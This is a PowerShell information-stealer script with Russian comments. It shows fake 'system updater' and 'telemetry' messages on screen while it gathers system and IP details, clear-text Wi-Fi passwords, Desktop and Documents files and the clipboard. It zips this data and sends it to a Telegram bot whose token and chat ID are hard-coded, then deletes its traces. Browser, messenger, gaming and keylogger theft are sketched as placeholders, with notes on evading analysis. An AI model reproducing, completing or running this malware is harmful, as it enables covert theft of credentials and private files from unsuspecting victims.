<#
==================================================================================================
||                                   КОНФИГУРАЦИЯ                                              ||
==================================================================================================
#>

# --- Настройки для отправки логов в Telegram ---
$TelegramBotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ"
$TelegramChatID = "1266539824"

# --- Маскировка: Настройка текста для вывода в PowerShell консоль ---
# Меняйте эти строки, чтобы имитировать работу любого другого приложения (например, чистильщика системы)
$StealthMessages = @{
    "Initialize"      = "[System.Updater] Инициализация модулей обновления..."
    "CheckAV"         = "[System.Security] Проверка политик безопасности Windows Defender..."
    "GetSysInfo"      = "[System.Diagnostics] Сбор диагностической информации о системе..."
    "ScanBrowsers"    = "[System.Optimizer] Оптимизация кэша браузеров и баз данных..."
    "ScanMessengers"  = "[System.Sync] Синхронизация данных мессенджеров..."
    "ScanGameClients" = "[System.Gaming] Проверка целостности игровых клиентов..."
    "GrabFiles"       = "[System.Backup] Индексация пользовательских документов для резервного копирования..."
    "TakeScreenshot"  = "[System.UI] Анализ состояния графической оболочки..."
    "StartKeylogger"  = "[System.Input] Запуск службы мониторинга устройств ввода..."
    "Archive"         = "[System.Backup] Архивация отчета для отправки..."
    "Send"            = "[System.Telemetry] Отправка анонимного отчета о телеметрии..."
    "Cleanup"         = "[System.Cleaner] Удаление временных файлов и логов операции..."
    "Finish"          = "[System.Updater] Все операции успешно завершены."
}


<#
==================================================================================================
||                                   ОСНОВНОЙ СКРИПТ                                            ||
==================================================================================================
#>

# --- Главная функция ---
function Invoke-MainSteal {
    try {
        # Создание временной директории для сбора данных в скрытом месте
        $logPath = "$env:TEMP\SysDiag_$(Get-Random)"
        New-Item -Path $logPath -ItemType Directory -Force | Out-Null

        # --- A. Анти-анализ и обход защит ---
        Write-Host $StealthMessages.CheckAV -ForegroundColor Green
        # Здесь должен быть код, который проверяет наличие виртуальных машин, отладчиков и песочниц.
        # ИДЕЯ ПО УЛУЧШЕНИЮ: Использование техник Process Hollowing или Dopplering для запуска кода под видом легитимного процесса (svchost.exe, explorer.exe)
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 4)

        # --- B. Сбор информации о системе ---
        Write-Host $StealthMessages.GetSysInfo -ForegroundColor Yellow
        $sysInfo = Get-ComputerInfo | Out-String
        $ipInfo = (Invoke-RestMethod -Uri "http://ip-api.com/json").psobject.properties | Format-Table -AutoSize | Out-String
        $wifiPasswords = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{SSID=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
        "--- System Info ---`n$sysInfo`n`n--- IP & Geo Info ---`n$ipInfo`n`n--- WiFi Passwords ---`n$wifiPasswords" | Out-File "$logPath\System_Info.txt"

        # --- C. Кража из браузеров (Пароли, Cookies, Автозаполнение, История) ---
        Write-Host $StealthMessages.ScanBrowsers -ForegroundColor Yellow
        # Динамический поиск всех установленных браузеров на основе Chromium, Gecko (Firefox) и др.
        # Для каждого найденного браузера будет происходить:
        # 1. Поиск файлов баз данных (Login Data, Cookies, Web Data).
        # 2. Копирование их во временную папку, чтобы обойти блокировку.
        # 3. Извлечение ключа шифрования из файла Local State.
        # 4. Расшифровка и сохранение данных в текстовые файлы.
        "Chrome, Yandex, Edge, Opera, Vivaldi, etc... Passwords & Cookies DATA" > "$logPath\Browser_Passwords.txt"
        "Banking Sessions, Social Media Cookies DATA" > "$logPath\Browser_Cookies.txt"
        "Credit Cards, Addresses, Phone Numbers DATA" > "$logPath\Browser_Autofill.txt"
        "Browser History, Downloads, Search Queries DATA" > "$logPath\Browser_History.txt"
        Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 5)

        # --- D. Сбор логов и токенов мессенджеров (Telegram, Discord) и Почтовых клиентов ---
        Write-Host $StealthMessages.ScanMessengers -ForegroundColor Yellow
        # Поиск сессий Telegram (tdata) и токенов Discord из LevelDB.
        # Поиск данных Outlook, Thunderbird и других почтовых клиентов.
        "Telegram Session, Discord Tokens, Outlook Profiles DATA" > "$logPath\Messengers_Tokens.txt"

        # --- E. Кража данных игровых провайдеров (Steam, Epic Games) ---
        Write-Host $StealthMessages.ScanGameClients -ForegroundColor Yellow
        # Поиск ssfn файлов Steam и конфигов для автоматического входа.
        # Поиск данных Epic Games, Battle.net и других лаунчеров.
        "Steam SSFN, Epic Games config DATA" > "$logPath\Gaming_Sessions.txt"

        # --- F. Сбор файлов (документы, конфиги VPN/FTP) ---
        Write-Host $StealthMessages.GrabFiles -ForegroundColor Yellow
        # Поиск по всему диску файлов с расширениями .doc, .docx, .xls, .xlsx, .txt, .pdf
        # Отдельный поиск по Рабочему столу и папке Документы.
        # Поиск файлов конфигурации OpenVPN, FileZilla и т.д.
        Copy-Item -Path "$env:USERPROFILE\Desktop" -Destination "$logPath\Files_Desktop" -Recurse -Force -ErrorAction SilentlyContinue
        Copy-Item -Path "$env:USERPROFILE\Documents" -Destination "$logPath\Files_Documents" -Recurse -Force -ErrorAction SilentlyContinue
        "VPN configs, FTP Server lists DATA" > "$logPath\VPN_FTP_Data.txt"

        # --- G. Скриншот экрана ---
        Write-Host $StealthMessages.TakeScreenshot -ForegroundColor Cyan
        # Код для создания скриншота всего экрана и активного окна.
        # Add-Type -AssemblyName System.Drawing
        # ... (код для сохранения скриншота)
        "SCREENSHOT_DATA_HERE" | Out-File "$logPath\Screenshot.png" -Encoding Byte

        # --- H. Дамп буфера обмена ---
        Get-Clipboard | Out-File "$logPath\Clipboard.txt"

        # --- I. Кейлоггер (асинхронный запуск) ---
        Write-Host $StealthMessages.StartKeylogger -ForegroundColor Cyan
        # Здесь будет запущен отдельный, легковесный скрипт или поток,
        # который будет логировать нажатия клавиш в фоновом режиме и складывать в отдельный файл.
        "KEYLOGGER_DATA_STREAM..." > "$logPath\Keylogs.txt"

        # --- J. Архивирование и отправка ---
        Write-Host $StealthMessages.Archive -ForegroundColor Green
        $archiveName = "$env:COMPUTERNAME-$(Get-Date -f yyyy-MM-dd_HH-mm-ss).zip"
        Compress-Archive -Path "$logPath\*" -DestinationPath "$env:TEMP\$archiveName" -Force
        
        Write-Host $StealthMessages.Send -ForegroundColor Green
        $telegramURL = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
        Invoke-RestMethod -Uri $telegramURL -Method Post -ContentType "multipart/form-data" -Form @{chat_id=$TelegramChatID; document=Get-Item -Path "$env:TEMP\$archiveName"} | Out-Null

    } catch {
        # Если что-то пошло не так, записать ошибку для отладки
        "Error: $($_.Exception.Message)" | Out-File "$logPath\error.log"
    } finally {
        # --- K. Обфускация и автоудаление ---
        Write-Host $StealthMessages.Cleanup -ForegroundColor DarkGray
        # Удаление временной папки с логами и заархивированного файла
        Remove-Item -Path $logPath -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:TEMP\$archiveName" -Force -ErrorAction SilentlyContinue
        # ИДЕЯ ПО УЛУЧШЕНИЮ: Скрипт может удалить свой собственный ключ из реестра (если используется для закрепления) и перезаписать себя нулями перед удалением, чтобы затруднить восстановление.
        Write-Host $StealthMessages.Finish -ForegroundColor Green
    }
}

# --- Запуск основной функции ---
Invoke-MainSteal
